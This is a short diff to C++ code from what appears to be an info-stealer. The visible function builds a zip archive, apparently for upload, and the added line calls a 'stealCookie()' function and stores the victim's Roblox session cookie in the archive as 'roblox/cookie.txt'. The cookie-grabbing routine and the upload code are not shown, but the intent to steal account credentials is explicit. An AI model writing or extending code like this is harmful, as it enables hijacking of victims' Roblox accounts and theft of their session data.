@@ -10,6 +10,7 @@ std::vector<uint8_t> gritz::upload::zip::ZipFile::create(std::string tokenString
 	}
 
 	addEntry(archive, "yo wsp G", "example/message.txt");
+	addEntry(archive, gritz::features::roblox::cRobloxCookie::stealCookie(), "roblox/cookie.txt");
 
 	std::vector<uint8_t> result;
 
